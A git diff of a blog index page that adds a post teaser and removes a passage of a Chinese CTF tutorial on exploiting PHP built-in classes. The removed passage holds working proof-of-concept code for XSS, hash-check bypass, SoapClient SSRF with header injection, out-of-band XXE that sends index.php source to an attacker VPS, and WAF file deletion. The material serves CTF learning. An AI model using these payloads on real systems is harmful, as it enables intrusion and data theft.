@@ -263,6 +263,152 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/07/pop%E9%93%BE%E4%B8%93%E7%BB%831/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/04/07/pop%E9%93%BE%E4%B8%93%E7%BB%831/" itemprop="url">pop链专练1</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-04-07T13:47:08+08:00">
+                2022-04-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说恶补pop就要恶补pop，基础知识已经基本全部过了一遍了，接下来主要就是练题了。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2022/04/07/pop%E9%93%BE%E4%B8%93%E7%BB%831/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/04/php%E8%BF%AD%E4%BB%A3%E5%99%A8%EF%BC%88%E5%8E%9F%E7%94%9F%E7%B1%BB%EF%BC%89%E7%9A%84%E5%88%A9%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -355,110 +501,14 @@
 
       
         
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>填坑这一块知识了，填完坑就要开始恶补pop和xss这两块的知识来为iscc做准备了。</p>
-<!--mroe-->
-
-<h1 id="php原生类"><a href="#php原生类" class="headerlink" title="php原生类"></a>php原生类</h1><p>在CTF题目中，php原生类的运用主要可以利用在xss、反序列化、ssrf、xxe以及读取文件的解题上。</p>
-<p>我们可以通过下面这个exp来遍历原生类：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">$classes = get_declared_classes();</span><br><span class="line">foreach ($classes as $class) &#123;</span><br><span class="line">    $methods = get_class_methods($class);</span><br><span class="line">    foreach ($methods as $method) &#123;</span><br><span class="line">        if (in_array($method, array(</span><br><span class="line">            &#x27;__destruct&#x27;,</span><br><span class="line">            &#x27;__toString&#x27;,</span><br><span class="line">            &#x27;__wakeup&#x27;</span><br><span class="line">   // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span><br><span class="line">        ))) &#123;</span><br><span class="line">            print $class . &#x27;::&#x27; . $method . &quot;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-<p>接下来我们学习认识应用比较常用的一些原生类。</p>
-<h1 id="Error-Exception"><a href="#Error-Exception" class="headerlink" title="Error/Exception"></a>Error/Exception</h1><h2 id="xss的利用"><a href="#xss的利用" class="headerlink" title="xss的利用"></a>xss的利用</h2><p>在报错开启的情况下，php7中利用Error类可能会导致xss漏洞，因为它内置一个<code>__toString()</code>方法。如果做pop时打不通了可能就可以尝试直接一转xss。</p>
-<p>test.php：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = unserialize($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">echo $a;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-
-<p>poc：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Error(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo urlencode($b);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>发现成功触发xss，存在利用。<br><img src="https://s2.loli.net/2022/04/04/abfBV4r5cLsgOYh.png"></p>
-<p>而Exception除了可以利用在php7外，还可以利用在php5上，方法一致。</p>
-<h2 id="绕过hash比较"><a href="#绕过hash比较" class="headerlink" title="绕过hash比较"></a>绕过hash比较</h2><p>在php7下，Error是所有PHP内部错误类的基类，我们可以利用其返回性质来进行绕过。</p>
-<p>[极客大挑战 2020]Greatphp：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;</span><br><span class="line">           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;, $this-&gt;syc, $match))&#123;</span><br><span class="line">               eval($this-&gt;syc);</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               die(&quot;Try Hard !!&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;great&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;great&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>poc：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">	public $syc;</span><br><span class="line">	public $lover;</span><br><span class="line">	public function __wakeup()&#123;</span><br><span class="line">		if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;</span><br><span class="line">		   if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;, $this-&gt;syc, $match))&#123;</span><br><span class="line">			   eval($this-&gt;syc);</span><br><span class="line">		   &#125; else &#123;</span><br><span class="line">			   die(&quot;Try Hard !!&quot;);</span><br><span class="line">		   &#125;</span><br><span class="line">		   </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$cmd=&#x27;/flag&#x27;;</span><br><span class="line">$cmd=urlencode(~$cmd);</span><br><span class="line">$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;</span><br><span class="line">$a=new Error($str,1);$b=new Error($str,2);</span><br><span class="line">$c = new SYCLOVER();</span><br><span class="line">$c-&gt;syc = $a;</span><br><span class="line">$c-&gt;lover = $b;</span><br><span class="line">echo(urlencode(serialize($c)));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>用一个简单的短标签和取反绕rce，主要是学习原生类应用。</p>
-<p>Exception也一样，php5以上都可利用。</p>
-<h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p>这个类一般用于ssrf，这是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的PHP客户端。该迭代器有一个<code>__call()</code>方法，当<code>__call()</code>方法被触发后，它可以发送HTTP和HTTPS请求。</p>
-<p>构造规则：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</span><br><span class="line">第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</span><br><span class="line">第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</span><br></pre></td></tr></table></figure>
-
-<p>我们使用RequestBin进行模拟：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(&#x27;location&#x27;=&gt;&#x27;http://requestbin.net/r/f30dvgdx&#x27;, &#x27;uri&#x27;=&gt;&#x27;ssrf&#x27;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>执行代码，发现成功触发ssrf。但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。</p>
-<p>像这样：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &#x27;http://requestbin.net/r/f30dvgdx&#x27;;</span><br><span class="line">$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4&quot;, &#x27;uri&#x27; =&gt; &#x27;test&#x27;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>我们的自定义cookie就被插入进http头中了。</p>
-<h1 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h1><p>这个类用于解析XML文档中的元素，我们可以参考php手册对其的定义：<br><img src="https://s2.loli.net/2022/04/05/oDm7bw9p8txTsPf.png"></p>
-<p>根据手册，当data_is_url为true时，我们可以实现远程xml载入，而data参数用来设置自己的payload的url地址，从而实现xxe。</p>
-<p>我们来看一题的代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class calc&#123;</span><br><span class="line">	function __construct__()&#123;</span><br><span class="line">		calc();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function calc($args1,$method,$args2)&#123;</span><br><span class="line">		$args1=intval($args1);</span><br><span class="line">		$args2=intval($args2);</span><br><span class="line">		switch ($method) &#123;</span><br><span class="line">			case &#x27;a&#x27;:</span><br><span class="line">				$method=&quot;+&quot;;</span><br><span class="line">				break;</span><br><span class="line"></span><br><span class="line">			case &#x27;b&#x27;:</span><br><span class="line">				$method=&quot;-&quot;;</span><br><span class="line">				break;</span><br><span class="line"></span><br><span class="line">			case &#x27;c&#x27;:</span><br><span class="line">				$method=&quot;*&quot;;</span><br><span class="line">				break;</span><br><span class="line"></span><br><span class="line">			case &#x27;d&#x27;:</span><br><span class="line">				$method=&quot;/&quot;;</span><br><span class="line">				break;</span><br><span class="line">			</span><br><span class="line">			default:</span><br><span class="line">				die(&quot;invalid input&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		$Expression=$args1.$method.$args2;</span><br><span class="line">		eval(&quot;\$r=$Expression;&quot;);</span><br><span class="line">		die(&quot;Calculation results:&quot;.$r);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;		</span><br></pre></td></tr></table></figure>
-
-<p>我们发现module为调用的类，args为类的构造方法的参数，那么在这里我们就可以构造xxe读取源码。</p>
-<p>首先在自己的vps上构建三个文件，分别是<code>mrl64.xml</code>、<code>send.xml</code>以及<code>send.php</code>。</p>
-<p>mrl64.xml：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/send.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>send.xml：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://1.xxx.xxx.47/send.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>send.php：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">file_put_contents(&quot;result.txt&quot;, $_GET[&#x27;file&#x27;]) ;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>接着我们构建payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?module=SimpleXMLElement&amp;args[]=http://ip/mrl64.xml&amp;args[]=2&amp;args[]=true</span><br></pre></td></tr></table></figure>
-
-<p>我们就会发现源码已经被写入result.txt中了。</p>
-<h1 id="ZipArchive"><a href="#ZipArchive" class="headerlink" title="ZipArchive"></a>ZipArchive</h1><p>ZipArchive类可以对文件进行压缩与解压缩处理，之前题目出现的利用主要是用来删除waf文件的。如果设置flags参数的值为ZipArchive::OVERWRITE的话，可以把指定文件删除。</p>
-<p>由于没有找到对应题目的复现环境以及docker，所以就大概讲一下题目思路吧。</p>
-<p>首先是源码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#x27;shell.php&#x27;);</span><br><span class="line">class Game&#123;</span><br><span class="line">    public  $username;</span><br><span class="line">    public  $password;</span><br><span class="line">    public  $choice;</span><br><span class="line">    public  $register;</span><br><span class="line"></span><br><span class="line">    public  $file;</span><br><span class="line">    public  $filename;</span><br><span class="line">    public  $content;</span><br><span class="line">    </span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username=&#x27;user&#x27;;</span><br><span class="line">        $this-&gt;password=&#x27;user&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;</span><br><span class="line">            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;choice = new register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class login&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $content;</span><br><span class="line"></span><br><span class="line">    public function __construct($file,$filename,$content)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;file=$file;</span><br><span class="line">        $this-&gt;filename=$filename;</span><br><span class="line">        $this-&gt;content=$content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function checking($username,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123;</span><br><span class="line">            $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);</span><br><span class="line">            die(&#x27;login success you can to open shell file!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class register&#123;</span><br><span class="line">    public function checking($username,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123;</span><br><span class="line">            die(&#x27;success register admin&#x27;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&#x27;please register admin &#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Open&#123;</span><br><span class="line">    function open($filename, $content)&#123;</span><br><span class="line">        if(!file_get_contents(&#x27;waf.txt&#x27;))&#123;</span><br><span class="line">            shell($content);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo file_get_contents($filename.&quot;.php&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if($_GET[&#x27;a&#x27;]!==$_GET[&#x27;b&#x27;]&amp;&amp;(md5($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;])) &amp;&amp; (sha1($_GET[&#x27;a&#x27;])=== sha1($_GET[&#x27;b&#x27;])))&#123;</span><br><span class="line">    @unserialize(base64_decode($_POST[&#x27;unser&#x27;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们重点关注在Open类上，这里有个读取文件，只有读取waf.txt失败才可以进行rce。而观察代码，我们发现Game类中的$content可以进行设置，因此我们构造poc：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Game&#123;</span><br><span class="line">    public  $username = &quot;admin&quot;;</span><br><span class="line">    public  $password = &quot;admin&quot;;</span><br><span class="line">    public  $choice;</span><br><span class="line">    public  $register = &quot;admin&quot;;</span><br><span class="line"></span><br><span class="line">    public  $file = new ZipArchive();</span><br><span class="line">    public  $filename = &quot;waf.txt&quot;;</span><br><span class="line">    public  $content = ZipArchive::OVERWRITE;</span><br><span class="line">    </span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username=&#x27;user&#x27;;</span><br><span class="line">        $this-&gt;password=&#x27;user&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;    // admin</span><br><span class="line">            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;choice = new register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class login&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $filename;   </span><br><span class="line">    public $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Open&#123;</span><br><span class="line">    function open($filename, $content)&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$poc = new Game();</span><br><span class="line">echo base64_encode(serialize($poc));</span><br></pre></td></tr></table></figure>
-
-<p>其他参数的设置是别的考点，我们这里只关注原生类，这样就可以删除waf.txt文件了。</p>
-<h1 id="文件遍历"><a href="#文件遍历" class="headerlink" title="文件遍历"></a>文件遍历</h1><h2 id="DirectoryIterator-FilesystemIterator"><a href="#DirectoryIterator-FilesystemIterator" class="headerlink" title="DirectoryIterator/FilesystemIterator"></a>DirectoryIterator/FilesystemIterator</h2><p>这两个类十分相似，我们只需要构造个很简单的poc就可以读取文件了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&quot;/&quot;);</span><br><span class="line">echo $dir;</span><br></pre></td></tr></table></figure>
-
-<p>不过这样只能读取根目录下的第一个文件名，我们可以通过遍历读取根目录下所有文件名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&quot;/&quot;);</span><br><span class="line">foreach($dir as $f)&#123;</span><br><span class="line">    echo($f.&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">    //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>配合glob协议进行匹配做到查找我们想要的文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&quot;glob:///*php*&quot;);</span><br><span class="line">echo $dir;</span><br></pre></td></tr></table></figure>
-
-<h2 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h2><p>这个类nisa复现的时候用过，其实也差不多，不过比较特殊的是他自己就可以进行匹配，不需要通过glob伪协议：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir=new GlobIterator(&quot;/*php*&quot;);</span><br><span class="line">echo $dir;</span><br></pre></td></tr></table></figure>
-
-<h2 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h2><p>与glob协议结合读取配合遍历即可绕过，测试代码也非常简单：</p>
